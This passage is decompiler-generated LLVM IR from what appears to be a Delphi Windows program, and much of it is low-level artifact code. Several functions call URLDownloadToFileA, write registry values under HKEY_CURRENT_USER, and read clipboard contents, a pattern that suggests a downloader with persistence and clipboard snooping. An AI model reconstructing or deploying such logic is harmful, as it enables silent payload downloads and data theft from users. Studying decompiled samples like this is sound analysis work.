  %20 = zext i8 %19 to i32, !insn.addr !412
  %21 = shl i32 1, %20, !insn.addr !412
  %22 = and i32 %18, %21, !insn.addr !412
  %23 = icmp ne i32 %22, 0, !insn.addr !412
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !412
  br label %dec_label_pc_404ba9, !insn.addr !412

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !413
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !413

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !414
  %27 = add i32 %esp.0.reload, -4, !insn.addr !415
  %28 = inttoptr i32 %27 to i32*, !insn.addr !415
  store i32 %26, i32* %28, align 4, !insn.addr !415
  %29 = add i32 %esp.0.reload, -8, !insn.addr !416
  %30 = inttoptr i32 %29 to i32*, !insn.addr !416
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !416
  %31 = call i32 @function_404b08(), !insn.addr !417
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !418
  %33 = add i32 %esp.0.reload, -12, !insn.addr !419
  %34 = inttoptr i32 %33 to i32*, !insn.addr !419
  store i32 0, i32* %34, align 4, !insn.addr !419
  %35 = call i32 @function_404b08(), !insn.addr !420
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !421
  %37 = add i32 %esp.0.reload, -16, !insn.addr !422
  %38 = inttoptr i32 %37 to i32*, !insn.addr !422
  store i32 0, i32* %38, align 4, !insn.addr !422
  %39 = call i32 @"@LStrCatN"(), !insn.addr !423
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !424
  br label %dec_label_pc_404c19, !insn.addr !424

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !425
  %41 = call i32 @"@LStrCat"(), !insn.addr !426
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !426
  br label %dec_label_pc_404c19, !insn.addr !426

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !427
  %43 = add i32 %esi.0.reload, -1, !insn.addr !428
  %44 = icmp eq i32 %43, 0, !insn.addr !428
  %45 = icmp eq i1 %44, false, !insn.addr !429
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !429
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !429
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !429
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !429
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !429

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !430
  %47 = load i32, i32* %46, align 4, !insn.addr !430
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !431
  %48 = add i32 %esp.2.reload, 8, !insn.addr !432
  %49 = inttoptr i32 %48 to i32*, !insn.addr !432
  store i32 4213835, i32* %49, align 4, !insn.addr !432
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !433
  %51 = call i32 @"@LStrClr"(), !insn.addr !434
  ret i32 %51, !insn.addr !435
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !436
  ret i32 %0, !insn.addr !436
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !437
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !438
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !439
  %2 = inttoptr i32 %0 to i32*, !insn.addr !439
  store i32 %1, i32* %2, align 4, !insn.addr !439
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !440
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !440
  %7 = add i8 %4, %6, !insn.addr !440
  %8 = inttoptr i32 %5 to i8*, !insn.addr !440
  store i8 %7, i8* %8, align 1, !insn.addr !440
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !441
  %10 = load i32, i32* %eax, align 4, !insn.addr !441
  %11 = udiv i32 %10, 256, !insn.addr !441
  %12 = trunc i32 %11 to i8, !insn.addr !441
  %13 = add i8 %9, %12, !insn.addr !441
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !441
  %14 = call i32 @function_4036b8(), !insn.addr !442
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !443
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !443
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !443
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !444
  %17 = call i32 @"@LStrCatN"(), !insn.addr !445
  %18 = call i32 @function_4036c8(), !insn.addr !446
  %19 = inttoptr i32 %18 to i32*, !insn.addr !447
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !447
  call void @__writefsdword(i32 0, i32 0), !insn.addr !448
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !449
  ret i32 %21, !insn.addr !450
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !451
  ret i32 %0, !insn.addr !451
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !452
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !453
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !454
  %5 = inttoptr i32 %3 to i32*, !insn.addr !454
  store i32 %4, i32* %5, align 4, !insn.addr !454
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !455
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !455
  %10 = add i8 %7, %9, !insn.addr !455
  %11 = inttoptr i32 %8 to i8*, !insn.addr !455
  store i8 %10, i8* %11, align 1, !insn.addr !455
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !456
  %14 = udiv i32 %1, 256, !insn.addr !456
  %15 = trunc i32 %14 to i8, !insn.addr !456
  %16 = add i8 %13, %15, !insn.addr !456
  %17 = load i32, i32* %edi, align 4, !insn.addr !456
  %18 = inttoptr i32 %17 to i8*, !insn.addr !456
  store i8 %16, i8* %18, align 1, !insn.addr !456
  %19 = load i8, i8* %6, align 4, !insn.addr !457
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !457
  %22 = add i8 %19, %21, !insn.addr !457
  %23 = inttoptr i32 %20 to i8*, !insn.addr !457
  store i8 %22, i8* %23, align 1, !insn.addr !457
  %24 = add i32 %0, -117, !insn.addr !458
  %25 = inttoptr i32 %24 to i8*, !insn.addr !458
  %26 = load i8, i8* %25, align 1, !insn.addr !458
  %27 = trunc i32 %2 to i8, !insn.addr !458
  %28 = add i8 %26, %27, !insn.addr !458
  store i8 %28, i8* %25, align 1, !insn.addr !458
  %29 = trunc i32 %2 to i16, !insn.addr !459
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !459
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !460
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !460
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !460
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !461
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !462
  %34 = add i32 %33, 1, !insn.addr !462
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !462
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !463
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !464
  ret i32 0, !insn.addr !465
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !466
  ret i32 %0, !insn.addr !466
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !467
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !468
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !469
  %2 = add i32 %1, -1, !insn.addr !469
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !469
  ret i32 %0, !insn.addr !470
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !471
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !472
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !473
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !474
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !475
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !476
  %2 = icmp eq i32 %1, 0, !insn.addr !477
  %3 = icmp eq i1 %2, false, !insn.addr !478
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !478
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !478

dec_label_pc_404d6d:                              ; preds = %dec_label_pc_404d38
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !479
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !480
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_4080f8, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_404de0, i32 0, i32 0), i32 -2147483647), !insn.addr !480
  %6 = icmp eq i32 %5, 0, !insn.addr !481
  %7 = icmp eq i1 %6, false, !insn.addr !482
  br i1 %7, label %dec_label_pc_404da9, label %dec_label_pc_404d99, !insn.addr !482

dec_label_pc_404d99:                              ; preds = %dec_label_pc_404d6d
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !483
  br label %dec_label_pc_404da9, !insn.addr !483

dec_label_pc_404da9:                              ; preds = %dec_label_pc_404d99, %dec_label_pc_404d6d
  %9 = call i32 @function_404374(), !insn.addr !484
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !484
  br label %dec_label_pc_404db2, !insn.addr !484

dec_label_pc_404db2:                              ; preds = %dec_label_pc_404da9, %dec_label_pc_404d38
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !485
}

define i32 @function_404dbb(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404dbb:
  %esp.1.reg2mem = alloca i32, !insn.addr !486
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !486
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !486
  %6 = inttoptr i32 %3 to i32*, !insn.addr !486
  store i32 %5, i32* %6, align 4, !insn.addr !486
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !487
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !487
  %11 = add i8 %8, %10, !insn.addr !487
  %12 = inttoptr i32 %9 to i8*, !insn.addr !487
  store i8 %11, i8* %12, align 1, !insn.addr !487
  %13 = add i32 %1, 122, !insn.addr !488
  %14 = inttoptr i32 %13 to i8*, !insn.addr !488
  %15 = load i8, i8* %14, align 1, !insn.addr !488
  %16 = udiv i32 %4, 256, !insn.addr !488
  %17 = trunc i32 %16 to i8, !insn.addr !488
  %18 = add i8 %15, %17, !insn.addr !488
  store i8 %18, i8* %14, align 1, !insn.addr !488
  %19 = load i8, i8* %7, align 4, !insn.addr !489
  %20 = load i32, i32* %eax, align 4, !insn.addr !489
  %21 = trunc i32 %20 to i8, !insn.addr !489
  %22 = add i8 %19, %21, !insn.addr !489
  %23 = icmp eq i8 %22, 0, !insn.addr !489
  %24 = inttoptr i32 %20 to i8*, !insn.addr !489
  store i8 %22, i8* %24, align 1, !insn.addr !489
  %25 = trunc i32 %3 to i16, !insn.addr !490
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !490
  br i1 %23, label %26, label %dec_label_pc_404dc9, !insn.addr !491

; <label>:26:                                     ; preds = %dec_label_pc_404dbb
  %27 = call i32 @unknown_4e40(), !insn.addr !491
  br label %dec_label_pc_404dc9, !insn.addr !491

dec_label_pc_404dc9:                              ; preds = %26, %dec_label_pc_404dbb
  %28 = icmp ult i8 %22, %19, !insn.addr !489
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !492
  store i32 %29, i32* %eax, align 4, !insn.addr !492
  br i1 %28, label %dec_label_pc_404e31, label %dec_label_pc_404dcc, !insn.addr !493

dec_label_pc_404dcc:                              ; preds = %dec_label_pc_404dc9
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !494, !insn.addr !489
  %31 = and i8 %30, 1, !insn.addr !489
  %32 = icmp eq i8 %31, 0, !insn.addr !489
  %33 = trunc i32 %arg4 to i16, !insn.addr !495
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !495
  %35 = inttoptr i32 %2 to i32*, !insn.addr !495
  store i32 %34, i32* %35, align 4, !insn.addr !495
  br i1 %32, label %dec_label_pc_404e2c, label %dec_label_pc_404dd0, !insn.addr !496

dec_label_pc_404dd0:                              ; preds = %dec_label_pc_404dcc
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !497
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !498
  %36 = add i32 %arg4, 1, !insn.addr !499
  %37 = icmp eq i32 %36, 0, !insn.addr !499
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !500
  br i1 %37, label %dec_label_pc_404e37, label %dec_label_pc_404dd6, !insn.addr !500

dec_label_pc_404dd6:                              ; preds = %dec_label_pc_404dd0
  %38 = load i32, i32* %eax, align 4, !insn.addr !501
  %39 = add i32 %38, -1, !insn.addr !501
  store i32 %39, i32* %eax, align 4, !insn.addr !501
  %40 = trunc i32 %36 to i16, !insn.addr !502
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !502
  %42 = load i32, i32* %41, align 4, !insn.addr !502
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !502
  %43 = load i32, i32* %41, align 4, !insn.addr !503
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !503
  %44 = add i32 %arg7, 105, !insn.addr !504
  %45 = inttoptr i32 %44 to i8*, !insn.addr !504
  %46 = load i8, i8* %45, align 1, !insn.addr !504
  %47 = trunc i32 %39 to i8, !insn.addr !504
  %48 = add i8 %46, %47, !insn.addr !504
  %49 = icmp ult i8 %48, %46, !insn.addr !504
  store i8 %48, i8* %45, align 1, !insn.addr !504
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !505
  br i1 %49, label %dec_label_pc_404e57, label %dec_label_pc_404de4, !insn.addr !505

dec_label_pc_404de4:                              ; preds = %dec_label_pc_404dd6
  %50 = icmp eq i8 %48, 0, !insn.addr !504
  br i1 %50, label %dec_label_pc_404e06, label %dec_label_pc_404de6, !insn.addr !506

dec_label_pc_404de6:                              ; preds = %dec_label_pc_404de4
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !507
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_404e57

dec_label_pc_404e06:                              ; preds = %dec_label_pc_404de4
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !508
  %53 = load i32, i32* %52, align 4, !insn.addr !508
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !508
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !509
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !510
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !511
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !512
  %55 = add i32 %arg6, -8, !insn.addr !513
  %56 = inttoptr i32 %55 to i32*, !insn.addr !513
  store i32 0, i32* %56, align 4, !insn.addr !513
  %57 = add i32 %arg6, -12, !insn.addr !514
  %58 = inttoptr i32 %57 to i32*, !insn.addr !514
  store i32 1, i32* %58, align 4, !insn.addr !514
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !515
  ret i32 %57, !insn.addr !515

dec_label_pc_404e2c:                              ; preds = %dec_label_pc_404dcc
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !516

dec_label_pc_404e31:                              ; preds = %dec_label_pc_404dc9
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !517
  %62 = add i8 %60, %61, !insn.addr !517
  %63 = inttoptr i32 %2 to i8*, !insn.addr !517
  store i8 %62, i8* %63, align 1, !insn.addr !517
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !518
  %65 = load i8, i8* %64, align 1, !insn.addr !518
  %66 = udiv i32 %arg3, 256, !insn.addr !518
  %67 = trunc i32 %66 to i8, !insn.addr !518
  %68 = add i8 %65, %67, !insn.addr !518
  store i8 %68, i8* %64, align 1, !insn.addr !518
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !518
  br label %dec_label_pc_404e37, !insn.addr !518

dec_label_pc_404e37:                              ; preds = %dec_label_pc_404e31, %dec_label_pc_404dd0
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !519
  %70 = inttoptr i32 %69 to i32*, !insn.addr !519
  store i32 0, i32* %70, align 4, !insn.addr !519
  %71 = add i32 %esp.0, -8, !insn.addr !520
  %72 = inttoptr i32 %71 to i32*, !insn.addr !520
  store i32 0, i32* %72, align 4, !insn.addr !520
  %73 = add i32 %esp.0, -12, !insn.addr !521
  %74 = inttoptr i32 %73 to i32*, !insn.addr !521
  store i32 ptrtoint ([27 x i8]* @global_var_404e9c to i32), i32* %74, align 4, !insn.addr !521
  %75 = add i32 %esp.0, -16, !insn.addr !522
  %76 = inttoptr i32 %75 to i32*, !insn.addr !522
  store i32 -2147483647, i32* %76, align 4, !insn.addr !522
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !523
  %78 = call i32 @function_4034c8(), !insn.addr !524
  %79 = add i32 %78, 1, !insn.addr !525
  %80 = add i32 %esp.0, -20, !insn.addr !526
  %81 = inttoptr i32 %80 to i32*, !insn.addr !526
  store i32 %79, i32* %81, align 4, !insn.addr !526
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !527
  br label %dec_label_pc_404e57, !insn.addr !527

dec_label_pc_404e57:                              ; preds = %dec_label_pc_404de6, %dec_label_pc_404e37, %dec_label_pc_404dd6
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !528
  %83 = add i32 %esp.1.reload, -4, !insn.addr !529
  %84 = inttoptr i32 %83 to i32*, !insn.addr !529
  store i32 %82, i32* %84, align 4, !insn.addr !529
  %85 = add i32 %esp.1.reload, -8, !insn.addr !530
  %86 = inttoptr i32 %85 to i32*, !insn.addr !530
  store i32 1, i32* %86, align 4, !insn.addr !530
  %87 = add i32 %esp.1.reload, -12, !insn.addr !531
  %88 = inttoptr i32 %87 to i32*, !insn.addr !531
  store i32 0, i32* %88, align 4, !insn.addr !531
  %89 = add i32 %esp.1.reload, -16, !insn.addr !532
  %90 = inttoptr i32 %89 to i32*, !insn.addr !532
  store i32 ptrtoint ([10 x i8]* @global_var_404eb8 to i32), i32* %90, align 4, !insn.addr !532
  %91 = add i32 %arg6, -8, !insn.addr !533
  %92 = inttoptr i32 %91 to i32*, !insn.addr !533
  %93 = load i32, i32* %92, align 4, !insn.addr !533
  %94 = add i32 %esp.1.reload, -20, !insn.addr !534
  %95 = inttoptr i32 %94 to i32*, !insn.addr !534
  store i32 %93, i32* %95, align 4, !insn.addr !534
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !535
  %97 = load i32, i32* %92, align 4, !insn.addr !536
  %98 = add i32 %esp.1.reload, -24, !insn.addr !537
  %99 = inttoptr i32 %98 to i32*, !insn.addr !537
  store i32 %97, i32* %99, align 4, !insn.addr !537
  %100 = call i32 @function_404374(), !insn.addr !538
  %101 = load i32, i32* %99, align 4, !insn.addr !539
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !540
  store i32 4214421, i32* %90, align 4, !insn.addr !541
  %102 = call i32 @"@LStrClr"(), !insn.addr !542
  ret i32 %102, !insn.addr !543
}

define i32 @function_404e8e() local_unnamed_addr {
dec_label_pc_404e8e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !544
  ret i32 %0, !insn.addr !544
}

define i32 @function_404e93() local_unnamed_addr {
dec_label_pc_404e93:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !545
}

define i32 @function_404e95() local_unnamed_addr {
dec_label_pc_404e95:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !546
}

define i32 @function_404e99(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_404e99:
  %.reg2mem = alloca i32, !insn.addr !547
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !547
  %5 = inttoptr i32 %2 to i8*, !insn.addr !547
  store i8 %4, i8* %5, align 1, !insn.addr !547
  %6 = add i32 %0, 111, !insn.addr !548
  %7 = inttoptr i32 %6 to i8*, !insn.addr !548
  %8 = load i8, i8* %7, align 1, !insn.addr !548
  %9 = trunc i32 %1 to i8, !insn.addr !548
  %10 = add i8 %8, %9, !insn.addr !548
  %11 = icmp eq i8 %10, 0, !insn.addr !548
  store i8 %10, i8* %7, align 1, !insn.addr !548
  br i1 %11, label %12, label %dec_label_pc_404ea1, !insn.addr !549

; <label>:12:                                     ; preds = %dec_label_pc_404e99
  %13 = call i32 @unknown_4f18(), !insn.addr !549
  br label %dec_label_pc_404ea1, !insn.addr !549

dec_label_pc_404ea1:                              ; preds = %12, %dec_label_pc_404e99
  %14 = icmp ult i8 %10, %8, !insn.addr !548
  br i1 %14, label %dec_label_pc_404f09, label %dec_label_pc_404ea4, !insn.addr !550

dec_label_pc_404ea4:                              ; preds = %dec_label_pc_404ea1
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !494, !insn.addr !548
  %16 = and i8 %15, 1, !insn.addr !548
  %17 = icmp eq i8 %16, 0, !insn.addr !548
  %18 = trunc i32 %arg4 to i16, !insn.addr !551
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !551
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !551
  store i32 %19, i32* %20, align 4, !insn.addr !551
  br i1 %17, label %dec_label_pc_404f04, label %dec_label_pc_404ea8, !insn.addr !552

dec_label_pc_404ea8:                              ; preds = %dec_label_pc_404ea4
  %21 = add i32 %arg4, 1, !insn.addr !553
  %22 = icmp eq i32 %21, 0, !insn.addr !553
  store i32 %arg2, i32* %.reg2mem, !insn.addr !554
  br i1 %22, label %dec_label_pc_404f0f, label %dec_label_pc_404eae, !insn.addr !554

dec_label_pc_404eae:                              ; preds = %dec_label_pc_404ea8
  %23 = add i32 %arg2, -1, !insn.addr !555
  %24 = trunc i32 %21 to i16, !insn.addr !556
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !556
  %26 = load i32, i32* %25, align 4, !insn.addr !556
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !556
  %27 = load i32, i32* %25, align 4, !insn.addr !557
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !557
  %28 = add i32 %arg7, 105, !insn.addr !558
  %29 = inttoptr i32 %28 to i8*, !insn.addr !558
  %30 = load i8, i8* %29, align 1, !insn.addr !558
  %31 = trunc i32 %23 to i8, !insn.addr !558
  %32 = add i8 %30, %31, !insn.addr !558
  %33 = icmp eq i8 %32, 0, !insn.addr !558
  store i8 %32, i8* %29, align 1, !insn.addr !558
  br i1 %33, label %dec_label_pc_404ede, label %dec_label_pc_404ebe, !insn.addr !559

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eae
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !560
  %34 = inttoptr i32 %23 to i8*, !insn.addr !561
  %35 = load i8, i8* %34, align 1, !insn.addr !561
  %36 = add i8 %35, %31, !insn.addr !561
  store i8 %36, i8* %34, align 1, !insn.addr !561
  %37 = add i32 %arg5, 86, !insn.addr !562
  %38 = inttoptr i32 %37 to i8*, !insn.addr !562
  %39 = load i8, i8* %38, align 1, !insn.addr !562
  %40 = trunc i32 %21 to i8, !insn.addr !562
  %41 = add i8 %39, %40, !insn.addr !562
  store i8 %41, i8* %38, align 1, !insn.addr !562
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !563
  %42 = call i32 @"@LStrClr"(), !insn.addr !564
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !565
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !566
  %44 = zext i1 %43 to i32, !insn.addr !567
  ret i32 %44, !insn.addr !567

dec_label_pc_404ede:                              ; preds = %dec_label_pc_404eae
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !568
  %46 = inttoptr i32 %45 to i8*, !insn.addr !568
  %47 = load i8, i8* %46, align 2, !insn.addr !568
  %48 = mul i8 %47, 2, !insn.addr !568
  store i8 %48, i8* %46, align 2, !insn.addr !568
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !569
  %50 = icmp eq i32* %49, null, !insn.addr !570
  br i1 %50, label %dec_label_pc_404f09, label %dec_label_pc_404eee, !insn.addr !571

dec_label_pc_404eee:                              ; preds = %dec_label_pc_404ede
  %51 = ptrtoint i32* %49 to i32, !insn.addr !569
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !572
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !573
  %53 = icmp eq i32* %52, null, !insn.addr !574
